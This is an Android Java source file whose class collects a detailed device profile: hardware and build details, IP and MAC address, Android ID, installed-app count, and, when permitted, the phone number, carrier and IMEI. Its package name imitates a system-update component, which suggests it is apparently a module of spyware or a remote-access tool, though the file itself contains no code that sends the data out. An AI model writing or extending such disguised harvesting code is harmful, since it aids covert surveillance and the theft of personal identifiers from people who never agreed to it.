package com.android.system.update.modules;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.StatFs;
import android.os.Environment;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

public class DeviceModule {
    private Context context;
    
    public DeviceModule(Context context) {
        this.context = context;
    }
    
    public String getDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            
            // Basic device info
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("device", Build.DEVICE);
            deviceInfo.put("product", Build.PRODUCT);
            deviceInfo.put("hardware", Build.HARDWARE);
            deviceInfo.put("board", Build.BOARD);
            deviceInfo.put("display", Build.DISPLAY);
            deviceInfo.put("host", Build.HOST);
            deviceInfo.put("id", Build.ID);
            deviceInfo.put("tags", Build.TAGS);
            deviceInfo.put("time", Build.TIME);
            deviceInfo.put("type", Build.TYPE);
            deviceInfo.put("user", Build.USER);
            
            // Android version info
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_int", Build.VERSION.SDK_INT);
            deviceInfo.put("codename", Build.VERSION.CODENAME);
            
            // Build info
            deviceInfo.put("build_fingerprint", Build.FINGERPRINT);
            
            // Screen info
            DisplayMetrics displayMetrics = new DisplayMetrics();
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            windowManager.getDefaultDisplay().getMetrics(displayMetrics);
            deviceInfo.put("screen_width", displayMetrics.widthPixels);
            deviceInfo.put("screen_height", displayMetrics.heightPixels);
            deviceInfo.put("screen_density", displayMetrics.densityDpi);
            
            // Storage info
            StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());
            long blockSize = statFs.getBlockSizeLong();
            long totalBlocks = statFs.getBlockCountLong();
            long availableBlocks = statFs.getAvailableBlocksLong();
            
            deviceInfo.put("total_storage", formatSize(totalBlocks * blockSize));
            deviceInfo.put("available_storage", formatSize(availableBlocks * blockSize));
            
            // Battery info (simplified)
            deviceInfo.put("is_charging", isDeviceCharging());
            
            // Network info
            deviceInfo.put("ip_address", getIPAddress());
            deviceInfo.put("mac_address", getMacAddress());
            
            // Telephony info (if available)
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                if (checkPermission(android.Manifest.permission.READ_PHONE_STATE)) {
                    deviceInfo.put("phone_number", telephonyManager.getLine1Number());
                    deviceInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
                    deviceInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                    deviceInfo.put("network_type", getNetworkType(telephonyManager));
                    deviceInfo.put("device_id", telephonyManager.getDeviceId());
                }
            }
            
            // Android ID (unique for device)
            deviceInfo.put("android_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            
            // Installed apps count
            PackageManager pm = context.getPackageManager();
            deviceInfo.put("installed_apps_count", pm.getInstalledApplications(0).size());
            
            return deviceInfo.toString(4); // Pretty print with 4 spaces
            
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private String formatSize(long bytes) {
        if (bytes <= 0) return "0 B";
        String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(bytes) / Math.log10(1024));
        return String.format("%.2f %s", bytes / Math.pow(1024, digitGroups), units[digitGroups]);
    }
    
    private boolean isDeviceCharging() {
        // Simplified - in real app you'd use BatteryManager
        return false;
    }
    
    private String getIPAddress() {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            int ip = wifiInfo.getIpAddress();
            return String.format("%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private String getMacAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : interfaces) {
                if (ni.getName().equalsIgnoreCase("wlan0")) {
                    byte[] macBytes = ni.getHardwareAddress();
                    if (macBytes == null) return "Unknown";
                    
                    StringBuilder sb = new StringBuilder();
                    for (byte b : macBytes) {
                        sb.append(String.format("%02X:", b));
                    }
                    if (sb.length() > 0) sb.deleteCharAt(sb.length() - 1);
                    return sb.toString();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "Unknown";
    }
    
    private String getNetworkType(TelephonyManager telephonyManager) {
        int type = telephonyManager.getNetworkType();
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_GSM: return "GSM";
            case TelephonyManager.NETWORK_TYPE_CDMA: return "CDMA";
            case TelephonyManager.NETWORK_TYPE_LTE: return "LTE";
            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
            case TelephonyManager.NETWORK_TYPE_EDGE: return "EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS: return "UMTS";
            case TelephonyManager.NETWORK_TYPE_HSPA: return "HSPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA: return "HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSDPA: return "HSDPA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0: return "EVDO";
            default: return "Unknown";
        }
    }
    
    private boolean checkPermission(String permission) {
        return context.checkCallingOrSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }
}